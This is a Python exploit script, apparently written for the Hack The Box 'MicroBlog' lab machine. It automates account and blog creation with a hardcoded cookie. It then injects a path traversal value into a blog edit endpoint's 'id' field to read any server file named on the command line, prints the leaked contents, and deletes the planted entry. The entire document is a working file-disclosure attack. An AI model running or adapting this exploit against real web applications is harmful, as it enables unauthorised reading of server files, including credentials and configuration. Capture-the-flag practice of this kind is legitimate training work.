import requests
import re
import sys
import warnings

warnings.filterwarnings("ignore")

def headers(base_url, path):
    headers = {
        'Origin': f'{base_url}',
        'Content-Type': 'application/x-www-form-urlencoded',
        'Referer': f'{base_url}{path}'
    }

    return headers

class Config:
    cookie = {'username': 'c4q60j1tb23ai5d153snlg8in5'}
    app_url = 'http://app.microblog.htb'
    blog_url = 'http://test.microblog.htb'
    account =  {
            'first-name': 'andro',
            'last-name': 'meda',
            'username':'andro',
            'password':'andro'
        }

class Setup:
    def __init__(self):
        if len(sys.argv) != 2:
            print(f'Usage: python3 {sys.argv[0]} <file>')
            sys.exit(1)

    def create_account(self, app_url, cookie):
        url = f'{app_url}/register/index.php'
        requests.post(url, data=Config.account, headers=headers(app_url, '/register/'), cookies=cookie)
    
    def create_blog(self, app_url, cookie):
        url = f'{app_url}/dashboard/index.php'
        data =  {'new-blog-name': 'test'}
        requests.post(url, data=data, headers=headers(app_url, '/dashboard'), cookies=cookie)

def leak_file(blog_url, cookie):
    url = f'{blog_url}/edit/index.php'
    id = f'../../../../../..{sys.argv[1]}'
    add_data =  {'id': id, 'txt': 'A'}
    remove_data =  {'action': 'delete', 'id': id}

    r = requests.post(url, data=add_data, headers=headers(blog_url, '/edit/'), cookies=cookie)
    requests.post(url, data=remove_data, headers=headers(blog_url, '/edit/'), cookies=cookie)
    data = re.search(r'const html = "<div class = \\".+?\\">(.*?)<\\/', r.text, re.DOTALL).group(1)
    file_contents = bytes(data, 'utf-8').decode('unicode_escape').replace('\\', '')
    print(file_contents)

def main():
    setup = Setup()
    setup.create_account(Config.app_url, Config.cookie)
    setup.create_blog(Config.app_url, Config.cookie)
    leak_file(Config.blog_url, Config.cookie)

if __name__ == "__main__":
    main()